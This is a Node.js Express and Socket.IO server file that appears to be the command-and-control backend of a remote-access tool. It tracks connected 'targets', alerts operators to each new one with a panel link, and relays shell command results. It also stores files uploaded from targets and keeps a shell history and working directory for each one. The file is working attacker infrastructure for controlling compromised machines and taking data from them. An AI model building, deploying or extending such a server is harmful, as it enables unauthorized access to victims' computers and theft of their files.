const express = require("express")
const router = express.Router()
const path = require("path")
const { TARGETS, ckeckOnlineTarget, base64Decoder } = require("../utils/server-helpers")
const fs = require("fs")

IO.on("connection", socket => {
    socket.on("connected", encodedData => {
        const data = base64Decoder(encodedData)
        const tarPath = path.join(process.__dirname, "public", "uploads", data.id)

        if (ckeckOnlineTarget(data.id)) { // exit the client for extra connection
            socket.disconnect(true)
        } else { // new client connection
            TARGETS[socket.id] = data.id

            if (!fs.existsSync(tarPath)) {
                fs.mkdirSync(tarPath)
                IO.emit('gl-msg', { title: "new target", value: `ID: ${data.id}<br>PANEL: <a target="_blank" href="/panel?id=${data.id}">goto</a>` })
            } else {
                IO.emit("conn-ping", data)
            }

            saveCwd(data.id, data.cwd)
        }
    })

    socket.on("to-server", encodedData => {
        const data = base64Decoder(encodedData)
        socket.broadcast.emit(`${data.id}-tar-data`, data)

        if (data.command == "cwd") saveCwd(data.id, data.value)
        saveHistory(data.id, data)
    })

    socket.on("disconnect", () => {
        const id = TARGETS[socket.id]
        IO.emit("disconn-ping", id)
        delete TARGETS[socket.id]
    })
})

router.post("/", (req, res) => {
    const { id, command } = req.query

    if (req.files) {
        const postFile = req.files.file
        postFile.mv(path.join(process.__dirname, 'public', 'uploads', id, postFile.name), (err) => {
            if (err) {
                console.log(err)
                IO.emit(`${id}-tar-data`, {
                    id,
                    command,
                    error: true,
                    value: `${postFile.name} fileupload error.`
                })
            } else {
                IO.emit(`${id}-tar-data`, {
                    id,
                    command,
                    error: false,
                    value: `/uploads/${id}/${postFile.name}`
                })
            }
        })
    }

    res.send("OK")
})

router.post("/to-stream", (req, res) => {
    const data = req.body
    try {
        if (req.files) {
            data.value = req.files.file.data.toString('base64')
            IO.emit(`${data.id}-tar-stream`, data)
        }
    } catch (error) { }

    res.send("OK")
})



function saveCwd(id, cwd) {
    const cwdPath = path.join(process.__dirname, "public", "uploads", id, "cwd")
    if (!fs.existsSync(cwdPath)) {
        fs.writeFileSync(cwdPath, "")
    }

    fs.writeFileSync(cwdPath, cwd)
}

function saveHistory(id, data) {
    const historyFile = path.join(process.__dirname, "public", "uploads", id, "shell_history.txt")
    if (!fs.existsSync(historyFile)) {
        fs.writeFileSync(historyFile, "")
    }

    fs.appendFile(historyFile, `\n[${data.command}]\n${data.value}`, (err) => {
        if (err) console.log(err)
    })
}

module.exports = router